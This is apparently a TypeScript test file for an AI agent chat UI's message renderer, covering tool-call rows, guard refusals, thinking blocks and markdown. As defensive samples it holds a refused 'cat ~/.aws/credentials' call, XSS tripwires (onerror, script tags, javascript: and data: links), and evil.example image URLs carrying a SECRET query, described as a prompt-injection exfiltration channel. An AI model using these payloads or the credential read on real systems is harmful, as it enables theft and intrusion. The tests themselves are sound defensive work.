import { expect, test } from 'bun:test'
import { summarizeToolInput } from '@enso/core'
import type { MessagePart, ToolCallPart, ToolResultPart } from '@tanstack/ai'
import type { ChatUISelectedPart } from '@tanstack/ai-client/ui'
import { renderToStaticMarkup } from 'react-dom/server'
import { FIXTURE_LINK_TRIPWIRE } from '../fixture-conversation.ts'
import { SelectedMessagePart } from '../selected-message-part.tsx'
import { ThreadStoresContext } from '../store.ts'
import { clearThreadsForTest, mintThread } from '../thread-stores.ts'

/**
 * The dispatch this file guards was DEAD for its whole prior life: TanStack routes tool
 * parts to `toolsComponents[name]` (exact name, no fallback), so the old
 * `partsComponents.toolCall` entry never rendered and an unregistered tool showed as
 * NOTHING plus a console warning. `SelectedMessagePart` exists so an unanticipated tool
 * name still renders through the textual contract — these tests are the CI guard for
 * that; the `?fixture` page is the visual one and nothing runs it in CI.
 */

const toolCallWith = (overrides: Partial<ToolCallPart>): ToolCallPart => ({
  type: 'tool-call',
  id: 'call-1',
  name: 'bash',
  arguments: '{}',
  state: 'complete' as ToolCallPart['state'],
  ...overrides,
})

const toolResultWith = (overrides: Partial<ToolResultPart>): ToolResultPart => ({
  type: 'tool-result',
  toolCallId: 'call-1',
  content: 'PLAIN TEXT FORM',
  state: 'complete' as ToolResultPart['state'],
  ...overrides,
})

const html = (selected: ChatUISelectedPart, isStreaming = false, runOpen = true): string =>
  renderToStaticMarkup(
    <SelectedMessagePart selected={selected} isStreaming={isStreaming} runOpen={runOpen} renderers={{}} />,
  )

test('a tool call from an UNREGISTERED name renders its name and result text', () => {
  const rendered = html({
    key: 'toolCall',
    part: toolCallWith({ name: 'mcp_tool_nobody_registered' }),
    result: toolResultWith({ content: 'the visible result text' }),
  })
  expect(rendered).toContain('mcp_tool_nobody_registered')
  expect(rendered).toContain('the visible result text')
})

// #407 item 1: pi hands a guard refusal over shaped like a failed command. With the call in the
// thread's denials it is the design's refusal card — the verdict, what was asked, the reason,
// who refused — and never the word `error`; the same result without a denial stays an error row.
// @pins guarded-tool-call/denial-entry
test('⚠ a refused call renders as the refusal card; the same error result without a denial is an error row', () => {
  const stores = mintThread()
  stores.guardDenials.set(new Map([['call-1', 'secret-path']]))
  const selected: ChatUISelectedPart = {
    key: 'toolCall',
    part: toolCallWith({ arguments: '{"command":"cat ~/.aws/credentials"}' }),
    result: toolResultWith({
      content: 'bash command refused: names credential material',
      state: 'error',
      error: 'refused',
    }),
  }
  const inPane = renderToStaticMarkup(
    <ThreadStoresContext.Provider value={stores}>
      <SelectedMessagePart selected={selected} isStreaming={false} runOpen={false} renderers={{}} />
    </ThreadStoresContext.Provider>,
  )
  expect(inPane).toContain('data-enso-tool-call="refused"')
  expect(inPane).toContain('Refused · credential path')
  expect(inPane).toContain('cat ~/.aws/credentials')
  expect(inPane).toContain('bash command refused: names credential material')
  expect(inPane).toContain('Enso guard')
  expect(inPane).toContain('secret-path')
  expect(inPane).not.toContain('>error<')
  const noDenial = html(selected, false, false)
  expect(noDenial).toContain('data-enso-tool-call="error"')
  expect(noDenial).not.toContain('Refused')
  clearThreadsForTest()
})

test('a tool call with no result yet renders the visible pending state', () => {
  const rendered = html({
    key: 'toolCall',
    part: toolCallWith({ id: 'call-2', state: 'pending' as ToolCallPart['state'] }),
  })
  expect(rendered).toContain('bash')
  expect(rendered).toContain('running…')
})

// #130: the same call once its run has ended — a stop, the server gone, a torn tail on
// resume — is aborted. The row says so, still dot, closed (nothing to open: no result).
test('⚠ a tool call with no result in a run that has ENDED reads aborted, not running', () => {
  const rendered = html(
    { key: 'toolCall', part: toolCallWith({ id: 'call-3', state: 'pending' as ToolCallPart['state'] }) },
    false,
    false,
  )
  expect(rendered).toContain('data-enso-tool-call="aborted"')
  expect(rendered).toContain('>aborted<')
  expect(rendered).not.toContain('running…')
  expect(rendered).not.toContain('animate-pulse')
  expect(rendered).not.toContain(' open')
})

// ── the step row (#90 PR 2) ──────────────────────────────────────────────────
// A tool call is one compact row — dot, name, subject — with IN/OUT folded beneath.

test('the step row names the tool and its subject, and folds the output beneath', () => {
  const rendered = html({
    key: 'toolCall',
    part: toolCallWith({ name: 'read', arguments: '{"path":"packages/web/src/x.ts"}' }),
    input: { path: 'packages/web/src/x.ts' },
    result: toolResultWith({ content: 'the file body' }),
  })
  expect(rendered).toContain('data-enso-tool-call="done"')
  expect(rendered).toContain('packages/web/src/x.ts')
  // Folded: a done row is a closed <details>, its output still in the markup for a click.
  expect(rendered).not.toContain(' open=""')
  expect(rendered).toContain('the file body')
})

// ⚠ AN ERROR OPENS ITSELF. A failure behind a click is a failure missed.
test('an errored step is marked and opens itself', () => {
  const rendered = html({
    key: 'toolCall',
    part: toolCallWith({ name: 'bash' }),
    result: toolResultWith({ error: 'exit 1: no such file' }),
  })
  expect(rendered).toContain('data-enso-tool-call="error"')
  expect(rendered).toContain(' open=""')
  expect(rendered).toContain('exit 1: no such file')
})

test('mid-stream, before the arguments parse, the row still shows the raw arguments', () => {
  const rendered = html({
    key: 'toolCall',
    part: toolCallWith({
      name: 'bash',
      arguments: '{"command":"ls -',
      state: 'input-streaming' as ToolCallPart['state'],
    }),
  })
  expect(rendered).toContain('data-enso-tool-call="pending"')
  expect(rendered).toContain('{&quot;command&quot;:&quot;ls -')
})

// The subject rule: pi's built-ins and the harness tools each name their subject one of
// five ways; anything else falls back to the first string, visibly, rather than to nothing.
test("the subject is the tool's own argument by precedence, else the first string", () => {
  expect(summarizeToolInput({ command: 'ls -la' })).toBe('ls -la')
  // grep carries both; the pattern is what you would ask about.
  expect(summarizeToolInput({ path: 'src', pattern: 'TODO' })).toBe('TODO')
  expect(summarizeToolInput({ subject: 'dynamic dispatch', count: 3 })).toBe('dynamic dispatch')
  expect(summarizeToolInput({ count: 3 })).toBeUndefined()
  expect(summarizeToolInput('not an object')).toBeUndefined()
})

test('a multi-line or long subject is clipped to one line with an ellipsis', () => {
  expect(summarizeToolInput({ command: 'sleep 4 && echo done\necho second line' })).toBe('sleep 4 && echo done…')
  const long = 'x'.repeat(200)
  expect(summarizeToolInput({ path: long })).toBe(`${'x'.repeat(80)}…`)
  expect(summarizeToolInput({ path: 'short' })).toBe('short')
})

test('an unmatched tool result renders through the same textual contract', () => {
  const rendered = html({
    key: 'toolResult',
    part: toolResultWith({ toolCallId: 'call-orphan', content: 'orphan result body' }),
    matched: false,
  })
  expect(rendered).toContain('orphan result body')
})

test('an unknown part kind renders visibly instead of vanishing', () => {
  // An image part, which no branch of the dispatcher claims — the generic member's
  // `part` is the broad `MessagePart` union, so this needs no cast.
  const imagePart: MessagePart = {
    type: 'image',
    source: { type: 'url', value: 'https://example.com/x.png' },
  }
  const rendered = html({ key: 'image', part: imagePart })
  expect(rendered).toContain('image')
})

test('a thinking part renders inside the Reasoning shell', () => {
  const thinkingPart: MessagePart = {
    type: 'thinking',
    content: 'the model reasoning text',
  }
  const rendered = html({ key: 'thinking', part: thinkingPart }, true)
  expect(rendered).toContain('the model reasoning text')
  expect(rendered).toContain('Thinking...')
})

// ⚠ NO NUMBER IT DOES NOT HAVE. A thinking block that was never observed streaming has no
// measured duration; upstream's "Thought for a few seconds" claimed one anyway.
test('a thinking block with no measured duration says Thought, with no invented seconds', () => {
  const thinkingPart: MessagePart = { type: 'thinking', content: 'done thinking' }
  const rendered = html({ key: 'thinking', part: thinkingPart }, false)
  expect(rendered).toContain('>Thought<')
  expect(rendered).not.toContain('few seconds')
})

// The text branch is the markdown pipeline of record (#53 S3: never rendered in a test).
test('a text part renders through the markdown pipeline inside the prose shell', () => {
  const textPart: MessagePart = { type: 'text', content: 'plain **bold** text' }
  const rendered = html({ key: 'text', part: textPart })
  expect(rendered).toContain('<strong>bold</strong>')
  expect(rendered).toContain('prose')
})

/**
 * The three tripwires the `?fixture` page carries for the human loop
 * (`fixture-conversation.ts`), as markup this file owns: the fixture is reachable only by
 * a human typing `?fixture` and nothing renders it in CI (#233). The `javascript:` link is a
 * RAW anchor here; the markdown-link form is its own case below.
 */
const RAW_HTML_TRIPWIRES = [
  'SENTINEL-BEFORE',
  '<img src="x" alt="inert tripwire" onerror="alert(\'img handler fired\')">',
  '<a href="javascript:alert(\'link fired\')">this link must be inert</a>',
  "<script>alert('script executed')</script>",
  'SENTINEL-AFTER',
].join('\n\n')

/**
 * ⚠ MODEL HTML NEVER BECOMES AN ELEMENT (#233). Model output is untrusted text entering a DOM.
 * Since `@tanstack/ai-react` 0.25, `TextPart` renders through `@tanstack/markdown`'s streaming
 * profile: raw HTML is ESCAPED rather than parsed and sanitised, and executable link
 * destinations are removed. (Before it, the chain was react-markdown with `rehype-raw` and
 * `rehype-sanitize` LAST, and this test pinned that order.) Markdown's OWN elements — links,
 * images — still render; what a remote image may fetch is the tests below it.
 *
 * So the raw tripwires must arrive as visible TEXT — escaped, not eaten, so the reply around
 * them survives whole — and as no element at all. A red line here means a renderer change
 * started turning model HTML back into elements: re-read what sanitises them before
 * re-pinning anything.
 */
test('⚠ raw HTML in model output renders as escaped text, never as an element', () => {
  const rendered = html({ key: 'text', part: { type: 'text', content: RAW_HTML_TRIPWIRES } })

  expect(rendered).toContain('SENTINEL-BEFORE')
  expect(rendered).toContain('SENTINEL-AFTER')
  // Visible as the characters the model wrote…
  expect(rendered).toContain('&lt;img src=&quot;x&quot;')
  expect(rendered).toContain('&lt;script&gt;')
  // …and never built: no image, no anchor, no script element.
  expect(rendered).not.toContain('<img')
  expect(rendered).not.toContain('<a ')
  expect(rendered).not.toContain('<script')
})

// The markdown-link form of the same tripwire: the destination whose scheme would run is dropped
// and the text stays, in place. The https link beside it is the control — links render at all, so
// the absence of the `javascript:` one is the renderer's decision, not a markdown miss.
test('⚠ a markdown link with an executable destination renders as its text; a https link stays a link', () => {
  const rendered = html({
    key: 'text',
    part: {
      type: 'text',
      content: '[run me](javascript:alert(1)) and [data](data:text/html,x) beside [safe](https://example.com)',
    },
  })
  expect(rendered).toContain('run me and data beside <a href="https://example.com">safe</a>')
  expect(rendered).not.toContain('javascript:')
  expect(rendered).not.toContain('data:text/html')
})

// #299: the `?fixture` page's own link tripwire must BE a link, or its inert render proves nothing —
// its old destination held spaces, so it never parsed and read as healthy with no sanitiser at all.
test("the fixture page's link tripwire is a well-formed link: a safe scheme renders it as one, its own is dropped", () => {
  const asLink = FIXTURE_LINK_TRIPWIRE.replace('javascript:', 'https://example.com/')
  expect(html({ key: 'text', part: { type: 'text', content: asLink } })).toContain('<a href="https://example.com/')
  const rendered = html({ key: 'text', part: { type: 'text', content: FIXTURE_LINK_TRIPWIRE } })
  expect(rendered).toContain('this link must be inert')
  expect(rendered).not.toContain('javascript:')
  expect(rendered).not.toContain('<a ')
})

// The link filter is an ALLOWLIST (`@tanstack/markdown` `sanitizeUrl`): it strips control
// characters and whitespace, then keeps only relative, http(s), mailto and tel. So a scheme
// spelled in mixed case or split by a tab is still refused — a denylist on `javascript:` would pass both.
test('⚠ a disguised executable scheme is refused too — mixed case, or split by a tab', () => {
  for (const destination of ['JaVaScRiPt:alert(1)', 'java\tscript:alert(1)']) {
    const rendered = html({ key: 'text', part: { type: 'text', content: `[inert](${destination})` } })
    expect(rendered).toContain('inert')
    expect(rendered).not.toContain('<a')
  }
})

/**
 * ⚠ A REMOTE IMAGE IS NOT FETCHED UNTIL A CLICK (PR #350 review; `markdown-image.tsx`). The
 * renderer would emit `<img src>` — and React a `<link rel="preload">` — for any http(s) URL,
 * which the browser requests with no click: the prompt-injection exfiltration channel. So the
 * reply carries a button naming the host and the full URL, and no element that fetches. The
 * two relative-LOOKING forms are the ones a pattern check misses: the link filter keeps
 * anything starting with `/`, and a browser resolves both to another host. The last three pin
 * that NO host is exempt — not the checker's own placeholder bases, not a reserved `.invalid`
 * name (a proxy still logs it), not this page's own origin written out absolutely.
 */
test('⚠ a remote markdown image renders as a click-to-load button showing the full URL — nothing fetches', () => {
  for (const [source, host] of [
    ['https://evil.example/p.png?q=SECRET', 'evil.example'],
    ['//evil.example/p.png?q=SECRET', 'evil.example'],
    ['/\\evil.example/p.png?q=SECRET', 'evil.example'],
    ['http://a.invalid/p.png?q=SECRET', 'a.invalid'],
    ['https://enso.invalid/p.png?q=SECRET', 'enso.invalid'],
    ['http://127.0.0.1:5178/p.png?q=SECRET', '127.0.0.1:5178'],
  ] as const) {
    const rendered = html({ key: 'text', part: { type: 'text', content: `![chart](${source})` } })
    expect(rendered).not.toContain('<img')
    expect(rendered).not.toContain('rel="preload"')
    expect(rendered).toContain(`aria-label="load image from ${host}"`)
    expect(rendered).toContain('p.png?q=SECRET')
  }
})

// The control: an image on this page's own server leaves nothing, so it renders at once.
test('a markdown image on this server renders as an <img> immediately', () => {
  const rendered = html({ key: 'text', part: { type: 'text', content: '![diagram](diagram.png)' } })
  expect(rendered).toContain('<img alt="diagram"')
  expect(rendered).toContain('src="diagram.png"')
})

// The user's image (#68): inline bytes render as the image; a URL source stays visible as data, not fetched.
test('an image part with inline bytes renders as an <img>; a URL-sourced one falls through to the visible block, never an <img>', () => {
  const inline: MessagePart = { type: 'image', source: { type: 'data', value: 'iVBORw0KGgo=', mimeType: 'image/png' } }
  const rendered = html({ key: 'image', part: inline })
  expect(rendered).toContain('<img alt="attached by the user"')
  expect(rendered).toContain('src="data:image/png;base64,iVBORw0KGgo="')

  const remote: MessagePart = { type: 'image', source: { type: 'url', value: 'https://example.com/x.png' } }
  const fallen = html({ key: 'image', part: remote })
  expect(fallen).not.toContain('<img')
  expect(fallen).toContain('https://example.com/x.png')
})
